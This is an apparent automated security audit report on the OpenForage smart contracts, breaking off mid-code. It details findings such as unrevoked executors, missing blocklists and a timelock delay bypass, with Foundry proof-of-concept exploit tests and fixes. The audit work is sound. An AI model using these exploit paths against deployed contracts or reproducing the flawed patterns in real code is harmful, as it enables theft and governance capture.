# Apex Report - openforage_audit_repo / Scan #6

## Table of contents

- [High](#high)
  - [OPEN-101 — Revoked registry executor keeps full deploy and return authority because HLTradingBridge ignores ROLE_EXECUTOR](#finding-open-101)
  - [OPEN-75 — Deploy script wires USDCTreasury as an unusable RISKUSDVault lossReporter](#finding-open-75)
  - [OPEN-80 — Partnership vesting wallets are shipped without any live blocklist path, so blocked beneficiaries can re-route up to 40M FORAGE votes after screening](#finding-open-80)
  - [OPEN-87 — Direct timelock execution bypasses ForageGovernor's 1-day delay floor](#finding-open-87)
  - [OPEN-84 — Partnership vesting wallets never wire a blocklist, allowing blocked beneficiaries to recover unvested governance power through unblocked mules](#finding-open-84)
  - [OPEN-94 — Partnership vesting wallets are permanently blocklist-less, letting blocked beneficiaries reroute unvested FORAGE votes to unblocked governance delegates](#finding-open-94)
  - [OPEN-98 — Blocked balances remain fully votable through pre-blocklist delegates](#finding-open-98)
  - [OPEN-99 — Expired opt-out tier holders can evade Tier-0 reversion indefinitely by rolling a dust pending withdrawal](#finding-open-99)
  - [OPEN-79 — Deployed bridge/treasury wiring leaves no reachable end-to-end loss-settlement path](#finding-open-79)
- [Medium](#medium)
  - [OPEN-102 — Revoked HyperLiquid executors retain permanent bridge control because executor rotation is dead config](#finding-open-102)
  - [OPEN-74 — Registry executor rotation never revokes the live HyperLiquid executor](#finding-open-74)
  - [OPEN-91 — Partnership vesting wallets never inherit the shared blocklist, letting blocked beneficiaries re-delegate up to 40M FORAGE](#finding-open-91)
  - [OPEN-95 — Routine guardian-seat rotation never changes the guardian set, leaving compromised guardians active after governance “finalization”](#finding-open-95)
  - [OPEN-82 — Genesis wiring never connects `RISKUSD`, `RISKUSDVault`, `StakingQueue`, or `atRISKUSD` to the governor/guardian pause graph](#finding-open-82)
  - [OPEN-86 — One directly executed proposal can schedule and execute arbitrary unscheduled payloads in the same transaction](#finding-open-86)
  - [OPEN-90 — Rotating the guardian module permanently severs guardian emergency control over HLTradingBridge](#finding-open-90)
  - [OPEN-89 — Blocklisted FORAGE holders keep full governance power through pre-arranged unblocked delegates](#finding-open-89)
  - [OPEN-100 — Daily redemption cap can be permanently poisoned by an obsolete high-supply snapshot](#finding-open-100)
  - [OPEN-69 — A ready accelerated guardian-seat rotation still installs the old successor after timelock retargets the precommitted successor](#finding-open-69)
  - [OPEN-73 — Treasury-created partnership wallets cannot be retrofitted or repaired with a blocklist after deployment](#finding-open-73)
  - [OPEN-81 — retryForageUnlock can spend a stale entry's lock budget to unlock later priority entries](#finding-open-81)
  - [OPEN-71 — Registry bridge cutover can strand reconciled return liquidity on the retired HyperLiquid bridge](#finding-open-71)
  - [OPEN-83 — Accelerated guardian-seat rotations stay executable after successor revocation](#finding-open-83)
  - [OPEN-72 — NAV posted after arrival reconciliation but before principal settlement double-subtracts the same returned cash](#finding-open-72)
  - [OPEN-92 — Global RISKUSD pause bricks atRISKUSD's advertised paused-withdrawal exit path](#finding-open-92)
- [Low](#low)
  - [OPEN-96 — Accelerated guardian rotation accepts the default zero successor and irreversibly burns honest seats](#finding-open-96)
  - [OPEN-76 — HLTradingBridge cannot execute the vault's nonce-bound loss workflow in production](#finding-open-76)
  - [OPEN-77 — Direct timelock execution lets the timelock grant itself PROPOSER_ROLE](#finding-open-77)
  - [OPEN-93 — Queue entries keep priority after emergencyUnlock removes their FORAGE backing](#finding-open-93)
  - [OPEN-78 — Real bridge losses are globally unbound, so one vault shortfall freezes every vault and burns can be booked against any vaultId](#finding-open-78)
  - [OPEN-85 — Live zero-nonce loss burns never notify VaultRegistry, so the real bridge path skips the same-block loss-resolution cooldown](#finding-open-85)
- [Informational](#informational)
  - [OPEN-70 — Tier loss socialization is not atomically coupled to RISKUSDVault settlement](#finding-open-70)
  - [OPEN-88 — DeployMainnet hands off ownership before wiring governor-based emergency pause into the core vault/token stack](#finding-open-88)
  - [OPEN-97 — Supplemental audit docs publish internal Codex thread IDs, task IDs, and prompt/skill metadata](#finding-open-97)

<a id="high"></a>
## High

<a id="finding-open-101"></a>
### OPEN-101 — Revoked registry executor keeps full deploy and return authority because HLTradingBridge ignores ROLE_EXECUTOR

#### Summary

Rotating `ROLE_EXECUTOR` in `CustodianRegistry` does not update `HLTradingBridge`'s live `_custodianExecutor`, so a revoked executor key can still call `deployToHyperLiquid()`, `requestWithdrawalIntent()`, `returnPrincipalUSDC()`, and `returnPnLUSDC()` while registry accounting continues to accept the bridge's callbacks. This is a split-authority failed-revocation bug.

#### Context Files

##### CustodianRegistry role rotation

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`
Highlight lines: 1

```solidity
function setCustodianRole(bytes32 id, bytes32 role, address account, bool allowed) external onlyOwner {
    ...
    if (!allowed) {
        ...
        _setRole(id, role, account, false);
        return;
    }
    _proposeCustodianRole(id, role, account);
}

function finalizeCustodianRole(bytes32 id, bytes32 role, address account) external onlyOwner {
    ...
    _setRole(id, role, account, true);
}
```

##### HLTradingBridge executor guard

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
_custodianExecutor = executor_;

function _requireExecutor() internal view {
    if (msg.sender != _custodianExecutor) revert UnauthorizedExecutor();
}
```

##### HLTradingBridge executor-gated capital flows

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1

```solidity
function deployToHyperLiquid(uint256 usdcE6) external whenNotPaused nonReentrant {
    _requireExecutor();
    ...
    _recordCustodianDeployment(usdcE6);
    IRISKUSDVaultCustodyPort(riskusdVault).deployCapital(usdcE6);
    token.safeTransfer(coldAccount, usdcE6);
}

function returnPrincipalUSDC(uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
    _recordCustodianReturn(amount);
    IRISKUSDVaultCustodyPort(riskusdVault).returnCapital(amount);
}

function returnPnLUSDC(uint256 vaultId, uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
    IUSDCTreasuryReturnPort(usdcTreasury).returnPnLUSDC(vaultId, amount);
}
```

#### Proof of Concept

Run the focused Forge repro that revokes the old executor in the registry, finalizes a new executor, and then confirms the new executor still reverts while the revoked old executor successfully deploys `1_000e6` and updates registry accounting.

##### forge test repro command

Path: ``

```bash
cd <public-audit-repo>/openforage_smart_contracts
forge test --match-path test/audit/validation/ExecutorRoleRotationValidation.t.sol \\
  --match-test test_oldExecutorRetainsBridgeAuthorityAfterRegistryRotation -vv
```

##### ExecutorRoleRotationValidation.t.sol

Path: `test/audit/validation/ExecutorRoleRotationValidation.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../../hyperliquid/HLTradingBridge.target.t.sol";

contract ExecutorRoleRotationValidation is HLTradingBridge_TargetCustody {
    address internal newExecutor = makeAddr("new-executor");

    function test_oldExecutorRetainsBridgeAuthorityAfterRegistryRotation() public {
        bytes32 id = custodianRegistry.HYPERLIQUID_CUSTODIAN_ID();
        bytes32 role = custodianRegistry.ROLE_EXECUTOR();

        vm.prank(owner);
        custodianRegistry.setCustodianRole(id, role, executor, false);
        assertFalse(custodianRegistry.hasCustodianRole(id, role, executor), "old executor role not revoked");

        vm.prank(owner);
        custodianRegistry.setCustodianRole(id, role, newExecutor, true);

        vm.warp(block.timestamp + custodianRegistry.FINALIZE_DELAY() + 1);
        vm.prank(owner);
        custodianRegistry.finalizeCustodianRole(id, role, newExecutor);

        assertTrue(custodianRegistry.hasCustodianRole(id, role, newExecutor), "new executor role not granted");
        assertFalse(custodianRegistry.hasCustodianRole(id, role, executor), "old executor role revived");

        vm.prank(newExecutor);
        vm.expectRevert(HLTradingBridge.UnauthorizedExecutor.selector);
        bridge.deployToHyperLiquid(1_000e6);

        uint256 vaultBalanceBefore = usdc.balanceOf(address(riskusdVault));
        vm.prank(executor);
        bridge.deployToHyperLiquid(1_000e6);

        assertEq(custodianRegistry.deployedByCustodian(id), 1_000e6, "deployment still recorded");
        assertEq(usdc.balanceOf(coldAccount), 1_000e6, "old executor still forwarded funds");
        assertEq(usdc.balanceOf(address(riskusdVault)), vaultBalanceBefore - 1_000e6, "vault debited");
    }
}
```

#### Recommendation

Make the bridge consume the registry’s executor role on every privileged call, or add a delayed bridge-side executor rotation path and require registry/bridge rotation to happen atomically.

For example:

```solidity
function _requireExecutor() internal view {
    if (!ICustodianRegistry(custodianRegistry).hasCustodianRole(
        ICustodianRegistry(custodianRegistry).HYPERLIQUID_CUSTODIAN_ID(),
        ICustodianRegistry(custodianRegistry).ROLE_EXECUTOR(),
        msg.sender
    )) revert UnauthorizedExecutor();
}
```

If runtime registry lookups are undesirable, then remove the registry executor-rotation surface entirely and make the bridge’s own delayed executor rotation the only source of truth.

#### Assumptions

- [x] The protocol expects `ROLE_EXECUTOR` in `CustodianRegistry` to be a live authority surface.
- [x] The same bridge remains the active HyperLiquid custodian bridge while governance rotates only the executor.
- [x] The old executor key is still controlled by an attacker or otherwise stale during revocation.

#### Predicted Invalid Reasons

- Executor rotation is handled operationally; the registry role is only informational.

<a id="finding-open-75"></a>
### OPEN-75 — Deploy script wires USDCTreasury as an unusable RISKUSDVault lossReporter

#### Summary

The deploy path initializes `RISKUSDVault` with `deployedUSDCTreasury` as `lossReporter`, but `USDCTreasury` has no callable path into the reporter-only loss-repair hooks. If a real shortfall triggers `lossPending()`, deposits and redemptions can stay blocked until governance rotates the reporter after the finalize delay.

#### Context Files

##### Deploy.s.sol

Path: `script/Deploy.s.sol`
Highlight lines: 1

```solidity
deployedRiskusdVault = _proxy(
    implRiskusdVault,
    abi.encodeCall(
        RISKUSDVault.initializeTarget,
        (cfg.usdc, deployedRiskusd, cfg.deployer, deployedHLTradingBridge, deployedUSDCTreasury)
    )
);
```

##### RISKUSDVault.sol

Path: `src/RISKUSDVault.sol`
Highlight lines: 1

```solidity
function _burnForLoss(uint256 vaultId, uint256 riskusdAmount, uint256 coverUsdcAmount) internal {
    if (msg.sender != _lossReporter) revert UnauthorizedLossReporter();
    ...
}

function replenish(uint256 usdcAmount) external nonReentrant {
    if (msg.sender != _lossReporter) revert UnauthorizedLossReporter();
    ...
}
```

##### USDCTreasury.sol

Path: `src/USDCTreasury.sol`
Highlight lines: 1

```solidity
function recognizePnL(uint256 vaultId, int256 amount) external { ... }
function recordPrincipalReturnUSDC(uint256 amount) external nonReentrant { ... }
function returnPnLUSDC(uint256 vaultId, uint256 amount) external nonReentrant { ... }
function disburse(bytes32 earmark, address recipient, uint256 amount) external onlyOwner nonReentrant { ... }
```

#### Proof of Concept

The deploy path hard-wires `deployedUSDCTreasury` as the vault's genesis `lossReporter`, but the treasury contract cannot originate the reporter-only loss-repair hooks. Once `lossPending()` activates, public deposits and redemptions are blocked until the reporter is rotated after the finalize delay.

##### Deploy.s.sol initializeTarget wiring

Path: `script/Deploy.s.sol`

```solidity
deployedRiskusdVault = _proxy(
    implRiskusdVault,
    abi.encodeCall(
        RISKUSDVault.initializeTarget,
        (cfg.usdc, deployedRiskusd, cfg.deployer, deployedHLTradingBridge, deployedUSDCTreasury)
    )
);
```

##### RISKUSDVault loss reporter guard

Path: `src/RISKUSDVault.sol`

```solidity
function _burnForLoss(uint256 vaultId, uint256 riskusdAmount, uint256 coverUsdcAmount) internal {
    if (msg.sender != _lossReporter) revert UnauthorizedLossReporter();
    ...
}
```

##### RISKUSDVault replenish guard

Path: `src/RISKUSDVault.sol`

```solidity
function replenish(uint256 usdcAmount) external nonReentrant {
    if (msg.sender != _lossReporter) revert UnauthorizedLossReporter();
    ...
}
```

##### USDCTreasury exposed surface

Path: `src/USDCTreasury.sol`

```solidity
function recognizePnL(uint256 vaultId, int256 amount) external { ... }
function recordPrincipalReturnUSDC(uint256 amount) external nonReentrant { ... }
function returnPnLUSDC(uint256 vaultId, uint256 amount) external nonReentrant { ... }
function disburse(bytes32 earmark, address recipient, uint256 amount) external onlyOwner nonReentrant { ... }
```

#### Recommendation

The deploy path should not point `lossReporter` at a contract that lacks the loss-repair interface.

Preferred fix:

```solidity
// Deploy.s.sol
abi.encodeCall(
    RISKUSDVault.initializeTarget,
    (cfg.usdc, deployedRiskusd, cfg.deployer, deployedHLTradingBridge, cfg.lossReporter)
);
```

and require `cfg.lossReporter` to implement the actual vault repair hooks or be an operator-controlled address that can hold/burn `RISKUSD` and replenish `USDC`.

If `USDCTreasury` is supposed to remain the reporter, then it needs explicit owner/governance-controlled methods that forward `burnForLoss`, `coverAndBurnForLoss`, and `replenish` into `RISKUSDVault`.

Fix checklist:

- [ ] Pass `cfg.lossReporter` into `RISKUSDVault.initializeTarget(...)` instead of `deployedUSDCTreasury`.
- [ ] Use a genesis reporter that can originate `burnForLoss()`, `coverAndBurnForLoss()`, and `replenish()`.
- [ ] Reject deployment when the configured reporter cannot exercise the vault role.

#### Assumptions

- [x] The audited deployment path in `script/Deploy.s.sol` is representative of the production stack this snapshot is meant to ship.
- [x] No omitted contract outside this snapshot has authority to make arbitrary calls from the `USDCTreasury` address.
- [x] A real loss or shortfall eventually occurs; without one, the dead repair path is latent rather than immediately visible.

#### Predicted Invalid Reasons

- This is just a no-broadcast readiness script, not proof about the live stack, and losses can still be handled operationally by governance.

<a id="finding-open-80"></a>
### OPEN-80 — Partnership vesting wallets are shipped without any live blocklist path, so blocked beneficiaries can re-route up to 40M FORAGE votes after screening

#### Summary

A partnership `DelegatingVestingWallet` is created without `setBlocklist()`, leaving `_blocklist == address(0)` and making the wallet’s beneficiary / wallet / delegate screening fail open. If the beneficiary is blocklisted later, they can still call `delegateVotingPower()` and move up to `40_000_000e18` FORAGE votes to an unblocked delegate, which can then propose and vote through `ForageGovernor`.

#### Context Files

##### FORAGETreasury.distributePartnership

Path: `src/FORAGETreasury.sol`
Highlight lines: 141, 154, 160

```solidity
function distributePartnership(
    address beneficiary,
    address delegatee,
    uint256 amount,
    uint64 start,
    uint64 duration,
    uint64 cliff
) external onlyOwner nonReentrant returns (address wallet) {
    if (_isBlocked(beneficiary) || _isBlocked(delegatee)) revert BlockedRecipient();

    wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
    DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
    _forageToken.safeTransfer(wallet, amount);
    DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
    DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
    totalPartnershipDistributed += amount;
}
```

#### Proof of Concept

Add the focused Foundry test `test/POC_DelegatingVestingWallet_34507355.t.sol` and run `forge test --match-path test/POC_DelegatingVestingWallet_34507355.t.sol -vv`. The PoC shows that a beneficiary who is blocklisted after `FORAGETreasury.distributePartnership()` can still call `wallet.delegateVotingPower(unblockedDelegate)`, move `40_000_000e18` votes to an unblocked delegate, and execute a governor proposal.

##### POC_DelegatingVestingWallet_34507355.t.sol

Path: `test/POC_DelegatingVestingWallet_34507355.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/governance/IGovernor.sol";
import "@openzeppelin/contracts/governance/TimelockController.sol";

import "../src/Blocklist.sol";
import "../src/DelegatingVestingWallet.sol";
import "../src/FORAGETreasury.sol";
import "../src/ForageGovernor.sol";
import "../src/ForageToken.sol";

/**
 * @title POC: Unwired partnership wallet restores blocked governance power
 * @notice Proof Statement: Proves that `FORAGETreasury.distributePartnership()` leaves the created
 * `DelegatingVestingWallet` without a blocklist, so a beneficiary who is later blocklisted can
 * still call `delegateVotingPower()` from the wallet, move 40M FORAGE votes to an unblocked
 * delegate, and use that delegate to create, pass, queue, and execute a real `ForageGovernor`
 * proposal.
 */
contract POC_DelegatingVestingWallet_34507355 is Test {
    uint256 internal constant PARTNERSHIP_AMOUNT = 40_000_000e18;
    uint48 internal constant VOTING_DELAY = 0;
    uint32 internal constant VOTING_PERIOD = 3_600;
    uint256 internal constant THRESHOLD_BPS = 100;
    uint256 internal constant QUORUM_BPS = 400;

    address internal owner = makeAddr("owner");
    address internal guardian = makeAddr("guardian");
    address internal teamVesting = makeAddr("teamVesting");
    address internal beneficiary = makeAddr("beneficiary");
    address internal unblockedDelegate = makeAddr("unblockedDelegate");

    Blocklist internal blocklist;
    ForageToken internal token;
    FORAGETreasury internal treasury;
    ForageGovernor internal governor;
    TimelockController internal timelock;

    function setUp() public {
        vm.warp(100);

        Blocklist blocklistImpl = new Blocklist();
        blocklist = Blocklist(
            address(new ERC1967Proxy(address(blocklistImpl), abi.encodeCall(Blocklist.initialize, (guardian, owner))))
        );

        ForageToken tokenImpl = new ForageToken();
        token = ForageToken(
            address(
                new ERC1967Proxy(
                    address(tokenImpl), abi.encodeCall(ForageToken.initialize, (teamVesting, owner, owner))
                )
            )
        );

        FORAGETreasury treasuryImpl = new FORAGETreasury();
        treasury = FORAGETreasury(
            address(
                new ERC1967Proxy(
                    address(treasuryImpl), abi.encodeCall(FORAGETreasury.initialize, (address(token), owner))
                )
            )
        );

        vm.startPrank(owner);
        token.setBlocklist(address(blocklist));
        treasury.setBlocklist(address(blocklist));
        token.transfer(address(treasury), PARTNERSHIP_AMOUNT);
        vm.stopPrank();

        address[] memory proposers = new address[](1);
        proposers[0] = owner;
        address[] memory executors = new address[](1);
        executors[0] = address(0);
        timelock = new TimelockController(0, proposers, executors, owner);

        ForageGovernor governorImpl = new ForageGovernor();
        governor = ForageGovernor(
            payable(
                address(
                    new ERC1967Proxy(
                        address(governorImpl),
                        abi.encodeCall(
                            ForageGovernor.initialize,
                            (
                                address(token),
                                address(timelock),
                                VOTING_DELAY,
                                VOTING_PERIOD,
                                THRESHOLD_BPS,
                                QUORUM_BPS,
                                address(0)
                            )
                        )
                    )
                )
            )
        );

        vm.startPrank(owner);
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governor));
        timelock.grantRole(timelock.CANCELLER_ROLE(), address(governor));
        vm.stopPrank();
    }

    function test_blockedBeneficiaryCanRecoverGovernanceThroughUnwiredPartnershipWallet() public {
        vm.prank(owner);
        address walletAddress = treasury.distributePartnership(
            beneficiary, beneficiary, PARTNERSHIP_AMOUNT, uint64(block.timestamp + 1), 365 days, 0
        );

        DelegatingVestingWallet wallet = DelegatingVestingWallet(walletAddress);
        assertEq(wallet.blocklist(), address(0), "partnership wallet is unwired");
        assertEq(token.delegates(walletAddress), beneficiary, "wallet delegates to beneficiary before block");
        assertEq(token.getVotes(beneficiary), PARTNERSHIP_AMOUNT, "beneficiary starts with wallet votes");

        address[] memory targets = new address[](1);
        targets[0] = address(governor);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(ForageGovernor.setMaxActiveProposals, (9));
        string memory description = "partnership blocklist bypass";

        vm.prank(guardian);
        blocklist.blockAddress(beneficiary);

        vm.prank(beneficiary);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, beneficiary));
        token.delegate(unblockedDelegate);

        vm.prank(beneficiary);
        vm.expectRevert(abi.encodeWithSelector(ForageGovernor.BlockedAddress.selector, beneficiary));
        governor.propose(targets, values, calldatas, description);

        vm.prank(beneficiary);
        wallet.delegateVotingPower(unblockedDelegate);

        assertEq(wallet.delegatee(), unblockedDelegate, "blocked beneficiary changed delegate");
        assertEq(token.delegates(walletAddress), unblockedDelegate, "wallet became token delegator");
        assertEq(token.getVotes(unblockedDelegate), PARTNERSHIP_AMOUNT, "delegate received all partnership votes");
        assertEq(token.getVotes(beneficiary), 0, "beneficiary no longer holds wallet votes");

        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        vm.prank(unblockedDelegate);
        uint256 proposalId = governor.propose(targets, values, calldatas, description);

        vm.warp(block.timestamp + governor.votingDelay() + 1);
        vm.roll(block.number + 1);

        vm.prank(unblockedDelegate);
        uint256 weight = governor.castVote(proposalId, 1);
        assertEq(weight, PARTNERSHIP_AMOUNT, "delegate can cast blocked beneficiary votes");

        vm.warp(block.timestamp + governor.votingPeriod() + 1);
        vm.roll(block.number + 1);
        assertEq(uint256(governor.state(proposalId)), uint256(IGovernor.ProposalState.Succeeded));

        bytes32 descriptionHash = keccak256(bytes(description));

        vm.prank(unblockedDelegate);
        governor.queue(targets, values, calldatas, descriptionHash);

        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);

        vm.prank(unblockedDelegate);
        governor.execute(targets, values, calldatas, descriptionHash);

        assertEq(governor.maxActiveProposals(), 9, "delegate executed governance action");
    }
}
```

#### Recommendation

The factory should wire the wallet to the shared blocklist before governance power is activated, and the protocol should expose a governance-controlled maintenance path for already-created wallets.

A minimal fix is to set the wallet blocklist inside `distributePartnership()` before `setForageToken()`:

```solidity
wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
DelegatingVestingWallet(wallet).setBlocklist(blocklist);
DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
_forageToken.safeTransfer(wallet, amount);
DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
```

Also add a treasury-owned helper that can call `setBlocklist()` / `replaceBrokenBlocklist()` on existing partnership wallets, and add a regression test that blocklists a beneficiary after distribution and verifies `delegateVotingPower()` reverts.

Fix checklist:

- [ ] Call `DelegatingVestingWallet(wallet).setBlocklist(blocklist)` inside `FORAGETreasury.distributePartnership()` before the wallet is used for delegation.
- [ ] Add an owner-only treasury helper that can invoke `setBlocklist()` and `replaceBrokenBlocklist()` on existing partnership wallets.

#### Assumptions

- [x] At least one partnership vesting wallet is used in production through `FORAGETreasury.distributePartnership()`.
- [x] The beneficiary can direct an unblocked delegate address they control or coordinate with.
- [x] Governance has not already upgraded `FORAGETreasury` to add a wallet-blocklist maintenance helper.

#### Predicted Invalid Reasons

- “This is only a blocklist/compliance edge case, and existing wallets are still controllable because the guardian can directly block the wallet.”

<a id="finding-open-87"></a>
### OPEN-87 — Direct timelock execution bypasses ForageGovernor's 1-day delay floor

#### Summary

`ForageGovernor` enforces `MIN_TIMELOCK_DELAY = 1 days` only on governor execution paths. A queued proposal that targets `timelock.updateDelay(0)` can still be executed directly through `TimelockController.executeBatch(...)` because `EXECUTOR_ROLE` is open to `address(0)`, bypassing the governor guard and leaving the timelock at `0` delay.

#### Context Files

##### ForageGovernor execution guards

Path: `src/ForageGovernor.sol`
Highlight lines: 1

```solidity
function relay(address target, uint256 value, bytes calldata data) public payable override(GovernorUpgradeable) {
    _enforceTimelockOperationGuards(_executor(), target, data);
    super.relay(target, value, data);
}

function _executeOperations(
    uint256 proposalId,
    address[] memory targets,
    uint256[] memory values,
    bytes[] memory calldatas,
    bytes32 descriptionHash
) internal override(GovernorUpgradeable, GovernorTimelockControlUpgradeable) {
    address executor = _executor();
    for (uint256 i = 0; i < targets.length;) {
        _enforceTimelockOperation(executor, targets[i], calldatas[i], true, false);
        unchecked { ++i; }
    }
    ...
    GovernorTimelockControlUpgradeable._executeOperations(proposalId, targets, values, calldatas, descriptionHash);
}
```

##### ForageGovernor timelock floor check

Path: `src/ForageGovernor.sol`
Highlight lines: 1

```solidity
function _enforceTimelockOperation(
    address executor,
    address target,
    bytes memory data,
    bool checkDelayFloor,
    bool checkSelfProposerGrant
) internal pure {
    if (target != executor || data.length < 4) return;
    bytes4 selector = _operationSelector(data);
    bytes memory payload = _operationPayload(data);
    if (checkDelayFloor && selector == _updateDelaySelector()) {
        uint256 newDelay = abi.decode(payload, (uint256));
        _revertIfDelayBelowFloor(newDelay);
        return;
    }
    ...
}
```

##### Governor timelock queue/state

Path: `lib/openzeppelin-contracts-upgradeable/contracts/governance/extensions/GovernorTimelockControlUpgradeable.sol`
Highlight lines: 1

```solidity
function _queueOperations(...) internal virtual override returns (uint48) {
    uint256 delay = $._timelock.getMinDelay();
    bytes32 salt = _timelockSalt(descriptionHash);
    $._timelockIds[proposalId] = $._timelock.hashOperationBatch(targets, values, calldatas, 0, salt);
    $._timelock.scheduleBatch(targets, values, calldatas, 0, salt, delay);
    return SafeCast.toUint48(block.timestamp + delay);
}

function state(uint256 proposalId) public view virtual override returns (ProposalState) {
    ...
    if ($._timelock.isOperationDone(queueId)) {
        return ProposalState.Executed;
    }
    ...
}
```

##### Timelock open execution

Path: `script/Deploy.s.sol`
Highlight lines: 1

```solidity
address[] memory executors = new address[](2);
executors[0] = deployer;
executors[1] = address(0);
deployedTimelock = address(new TimelockController(_minDelay(), proposers, executors, deployer));
```

##### Timelock batch execution

Path: `lib/openzeppelin-contracts-upgradeable/contracts/governance/TimelockControllerUpgradeable.sol`
Highlight lines: 1

```solidity
function executeBatch(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata payloads,
    bytes32 predecessor,
    bytes32 salt
) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {
    bytes32 id = hashOperationBatch(targets, values, payloads, predecessor, salt);
    _beforeCall(id, predecessor);
    for (uint256 i = 0; i < targets.length; ++i) {
        _execute(targets[i], values[i], payloads[i]);
    }
    _afterCall(id);
}
```

#### Proof of Concept

Create and run the Foundry test from the analysis to confirm the bypass:
- Queue a proposal with `target = timelock` and `calldatas[0] = abi.encodeCall(timelock.updateDelay, (0))`.
- After queueing and warping past ETA, `governor.execute(...)` reverts with `TimelockDelayBelowMinimum`.
- The same queued batch succeeds via `timelock.executeBatch(...)` from an arbitrary `attacker`, sets `timelock.getMinDelay()` to `0`, and makes `governor.state(proposalId)` `Executed`.

##### POC_ForageGovernor_DirectTimelockExecution_Bypass_1c5c0134

Path: `test/validation/POC_ForageGovernorDirectExecValidation_1c5c0134.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../helpers/ForageGovernorTestBase.sol";
import "../../src/ForageGovernor.sol";
import "@openzeppelin/contracts/governance/IGovernor.sol";

/**
 * @title POC: Direct Timelock Execution Bypasses ForageGovernor Delay Floor
 * @notice Proof Statement: Proves that a proposal containing `timelock.updateDelay(0)` cannot be executed through
 * `ForageGovernor.execute` because the governor enforces `MIN_TIMELOCK_DELAY`, yet the exact same queued operation can
 * still be executed by an arbitrary external account through `TimelockController.executeBatch` when `EXECUTOR_ROLE` is
 * open to `address(0)`. After the direct execution, the live timelock delay becomes zero and the governor reports the
 * proposal as `Executed`.
 */
contract POC_ForageGovernor_DirectTimelockExecution_Bypass_1c5c0134 is ForageGovernorTestBase {
    function test_directExecuteBatchBypassesGovernorDelayFloor() public {
        bytes32 executorRole = keccak256("EXECUTOR_ROLE");

        assertEq(governor.MIN_TIMELOCK_DELAY(), 1 days, "fixture expects a one-day floor");
        assertTrue(timelock.hasRole(executorRole, address(0)), "fixture expects open execution");
        assertFalse(timelock.hasRole(executorRole, attacker), "attacker has no dedicated executor role");

        _setTimelockDelayViaGovernance(PRODUCTION_TIMELOCK_DELAY);
        assertEq(timelock.getMinDelay(), PRODUCTION_TIMELOCK_DELAY, "setup must raise the live timelock delay");

        address[] memory targets = new address[](1);
        targets[0] = address(timelock);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(timelock.updateDelay, (0));

        string memory description = "POC: direct executeBatch bypasses governor delay floor";
        bytes32 descriptionHash = keccak256(bytes(description));
        uint256 proposalId = _createProposalWithParams(targets, values, calldatas, description);
        _passProposal(proposalId);

        governor.queue(targets, values, calldatas, descriptionHash);

        bytes32 salt = bytes20(address(governor)) ^ descriptionHash;
        bytes32 operationId = timelock.hashOperationBatch(targets, values, calldatas, bytes32(0), salt);
        assertTrue(timelock.isOperationPending(operationId), "proposal must be queued in timelock");

        vm.warp(block.timestamp + PRODUCTION_TIMELOCK_DELAY + 1);

        vm.expectRevert(
            abi.encodeWithSelector(ForageGovernor.TimelockDelayBelowMinimum.selector, 0, governor.MIN_TIMELOCK_DELAY())
        );
        governor.execute(targets, values, calldatas, descriptionHash);

        assertEq(timelock.getMinDelay(), PRODUCTION_TIMELOCK_DELAY, "governor path must leave delay unchanged");
        assertEq(uint8(governor.state(proposalId)), uint8(IGovernor.ProposalState.Queued), "proposal remains queued");

        vm.prank(attacker);
        timelock.executeBatch(targets, values, calldatas, bytes32(0), salt);

        assertTrue(timelock.isOperationDone(operationId), "timelock must mark the operation executed");
        assertEq(timelock.getMinDelay(), 0, "direct execution must drop the live delay to zero");
        assertEq(uint8(governor.state(proposalId)), uint8(IGovernor.ProposalState.Executed), "state must read executed");
    }

    function _setTimelockDelayViaGovernance(uint256 newDelay) internal {
        address[] memory targets = new address[](1);
        targets[0] = address(timelock);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeCall(timelock.updateDelay, (newDelay));

        string memory description = "Setup: raise timelock delay";
        bytes32 descriptionHash = keccak256(bytes(description));
        uint256 proposalId = _createProposalWithParams(targets, values, calldatas, description);
        _passProposal(proposalId);

        governor.queue(targets, values, calldatas, descriptionHash);
        vm.warp(block.timestamp + TIMELOCK_MIN_DELAY + 1);
        governor.execute(targets, values, calldatas, descriptionHash);
    }
}
```

##### Run PoC

Path: `bash`

```bash
cd openforage_smart_contracts
timeout 300 forge test --match-path test/validation/POC_ForageGovernorDirectExecValidation_1c5c0134.t.sol -vv
```

#### Recommendation

Primary fix: prevent direct execution of governor-owned timelock operations from bypassing governor-side validation.

A robust approach is to remove the open executor role for governor-managed timelocks and require execution to flow through `ForageGovernor.execute()` only, or to move the delay-floor validation into the timelock itself so it also applies to direct `execute()` / `executeBatch()` calls.

Example hardening directions:

```solidity
// Option 1: do not leave EXECUTOR_ROLE open in production
executors[0] = address(governor);
// omit address(0)
```

```solidity
// Option 2: reject unsafe self-calls inside a timelock override
